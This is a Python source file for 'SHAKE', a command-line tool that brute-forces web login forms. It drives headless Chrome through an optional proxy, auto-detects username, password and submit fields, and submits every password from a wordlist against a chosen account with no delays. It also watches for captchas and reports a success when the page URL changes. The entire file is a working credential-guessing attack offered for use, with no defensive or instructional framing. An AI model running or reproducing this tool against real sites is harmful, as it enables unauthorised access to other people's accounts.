#!/usr/bin/env python3
# Name: SHAKE
# Developer: Qrh9
# Developer Page: https://qrh9.github.io/

import sys
import random
import requests
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.common.exceptions import (
    NoSuchElementException,
    WebDriverException
)

class Color:
    RED    = '\033[91m'
    GREEN  = '\033[92m'
    YELLOW = '\033[93m'
    CYAN   = '\033[96m'
    BOLD   = '\033[1m'
    END    = '\033[0m'

BANNER = Color.BOLD + Color.RED + r'''
   _____ _    _        _  ______
  / ____| |  | |      | |/ /___ \
 | (___ | |__| |   ___| ' /  __) |
  \___ \|  __  |  / _ \  <  |__ <
  ____) | |  | | |  __/ . \ ___) |
 |_____/|_|  |_|  \___|_|\_\____/
''' + f"{Color.RED}[{Color.END}-{Color.RED}]--> {Color.GREEN}SHAKE\n" \
  + f"{Color.RED}[{Color.END}-{Color.RED}]--> {Color.GREEN}Developer: Qrh9\n" \
  + f"{Color.RED}[{Color.END}-{Color.RED}]--> {Color.GREEN}https://qrh9.github.io/\n" \
  + Color.END

COMMON_USERNAME_SELECTORS = [
    'input[name="username"]',
    'input[id="username"]',
    'input[name="user"]',
    'input[id="user"]',
    'input[name="email"]',
    'input[name="login"]',
    'input[type="text"]'
]

COMMON_PASSWORD_SELECTORS = [
    'input[name="password"]',
    'input[id="password"]',
    'input[name="pass"]',
    'input[id="passwd"]',
    'input[type="password"]'
]

COMMON_BUTTON_SELECTORS = [
    'button[type="submit"]',
    'input[type="submit"]',
    'button[name="login"]',
    '#loginbtn',
    '.btn.btn-primary'
]

COMMON_CAPTCHA_SELECTORS = [
    'div.g-recaptcha',
    'iframe[src*="recaptcha"]',
    'input[name="captcha"]',
    '#captcha',
    '.captcha'
]

def captchokiller(driver):
    """Check for known captcha """
    for sel in COMMON_CAPTCHA_SELECTORS:
        found = driver.find_elements(By.CSS_SELECTOR, sel)
        if found:
            return True
    return False

def selector_css(driver, common_list):
    for s in common_list:
        try:
            driver.find_element(By.CSS_SELECTOR, s)
            return s
        except NoSuchElementException:
            pass
    raise NoSuchElementException("No matching selector found for auto-detection.")

def runBRU(website, username, passfile, uname_sel, pass_sel, login_sel, proxy):
    print(BANNER)
    try:
        with open(passfile, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [x.strip() for x in f if x.strip()]
    except:
        print(f"{Color.RED}[Error]{Color.END} Could not read password list.")
        sys.exit(1)

    chrome_options = webdriver.ChromeOptions()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-gpu")
    if proxy.lower() != "skip":
        chrome_options.add_argument(f"--proxy-server={proxy}")
    chrome_options.add_argument("user-agent=Mozilla/5.0 (X11; Linux x86_64)")

    try:
        driver = webdriver.Chrome(options=chrome_options)
    except WebDriverException as e:
        print(f"{Color.RED}[Error]{Color.END} Cannot initialize Chrome driver: {e}")
        sys.exit(1)

    try:
        try:
            driver.get(website)
        except WebDriverException as e:
            print(f"{Color.RED}[Error]{Color.END} Could not connect to {website}: {e}")
            driver.quit()
            sys.exit(1)

        if captchokiller(driver):
            print(f"{Color.RED}[Warning]{Color.END} Captcha detected. Bruteforce may fail.")

        if uname_sel.lower() == "skip":
            try:
                uname_sel = selector_css(driver, COMMON_USERNAME_SELECTORS)
            except NoSuchElementException:
                print(f"{Color.RED}[Error]{Color.END} Could not find a username field.")
                driver.quit()
                sys.exit(1)
        if pass_sel.lower() == "skip":
            try:
                pass_sel = selector_css(driver, COMMON_PASSWORD_SELECTORS)
            except NoSuchElementException:
                print(f"{Color.RED}[Error]{Color.END} Could not find a password field.")
                driver.quit()
                sys.exit(1)
        if login_sel.lower() == "skip":
            try:
                login_sel = selector_css(driver, COMMON_BUTTON_SELECTORS)
            except NoSuchElementException:
                print(f"{Color.RED}[Error]{Color.END} Could not find a login button.")
                driver.quit()
                sys.exit(1)

        # Bruteforce loop, no delays
        for pwd in passwords:
            try:
                driver.get(website)
                user_field = driver.find_element(By.CSS_SELECTOR, uname_sel)
                pass_field = driver.find_element(By.CSS_SELECTOR, pass_sel)
                login_btn  = driver.find_element(By.CSS_SELECTOR, login_sel)

                user_field.clear()
                pass_field.clear()
                user_field.send_keys(username)
                pass_field.send_keys(pwd)

                print(f"{Color.CYAN}[Trying]{Color.END} {username}:{pwd}")
                login_btn.click()

                if captchokiller(driver):
                    print(f"{Color.RED}[Blocked]{Color.END} Captcha triggered.")
                    break

                if driver.current_url != website:
                    print(f"{Color.GREEN}[Success]{Color.END} {username}:{pwd}")
                    break

            except NoSuchElementException:
                continue
            except KeyboardInterrupt:
                print(f"{Color.RED}[Abort]{Color.END} Stopped by user.")
                break
            except Exception:

                continue
        else:
            print(f"{Color.YELLOW}[Info]{Color.END} No valid password found.")
    finally:
        driver.quit()

def main():
    print(BANNER)
    website   = input("Website URL: ").strip()
    username  = input("Username: ").strip()
    passfile  = input("Path to password list: ").strip()
    proxy     = input("Proxy (host:port) or 'skip': ").strip()
    if not proxy:
        proxy = "skip"

    uname_sel = input("Username selector or 'skip': ").strip()
    if not uname_sel:
        uname_sel = "skip"
    pass_sel  = input("Password selector or 'skip': ").strip()
    if not pass_sel:
        pass_sel = "skip"
    login_sel = input("Login button selector or 'skip': ").strip()
    if not login_sel:
        login_sel = "skip"

    if not website or not username or not passfile:
        print(f"{Color.RED}[Error]{Color.END} Missing required info.")
        sys.exit(1)

    runBRU(website, username, passfile, uname_sel, pass_sel, login_sel, proxy)

if __name__ == "__main__":
    main()
